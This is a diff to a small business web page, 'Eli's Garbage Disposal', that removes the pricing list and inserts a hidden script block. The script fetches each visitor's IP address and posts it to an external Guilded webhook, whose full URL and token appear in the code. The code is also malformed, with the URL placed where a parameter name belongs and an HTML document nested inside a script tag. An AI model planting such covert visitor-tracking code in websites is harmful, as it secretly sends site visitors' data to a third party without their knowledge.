@@ -12,18 +12,45 @@
       <a href="https://forms.gle/wXTLmN7LC25vZfZFA">Games</a>
     </div>
 
+    <script>
+    <!doctype html>
+<html>
+<body>
+<script>
+async function sendIPToGuilded(https://media.guilded.gg/webhooks/0b72c47e-9468-4803-838b-c9e22cf5ab98/Kr5CbmrsAMSkacCc42Myy6QaMEweOYosCa8YGGwcmssWCUuCWACMYkqAkOswMgcQsacweY6GoSOo0miaG2WYeM) {
+  try {
+    const ipResp = await fetch('https://api.ipify.org?format=json');
+    const { ip } = await ipResp.json();
+
+    const message = `My IP is: ${ip}`;
+
+    const resp = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message })
+    });
+
+    if (!resp.ok) throw new Error('Webhook post failed: ' + resp.status);
+    console.log('Sent to Guilded:', message);
+  } catch (err) {
+    console.error('Error:', err);
+  }
+}
+
+// Replace with your Guilded webhook URL
+sendIPToGuilded('YOUR_GUILDED_WEBHOOK_URL');
+</script>
+</body>
+</html>
+
+    </script>
+    
     <h1>Eli's Garbage Disposal.</h1>
 
     <p>
-      LOADING...
+      Some content failed to load :/
     </p>
   <br>
-    <h3>Pricing:<h3>
-      <p>
-      One Trash Bag: $1
-        Two Trash Bags: $2
-        Three Trash Bags: $2.50
-      </p>
   </body>
 </html>
 
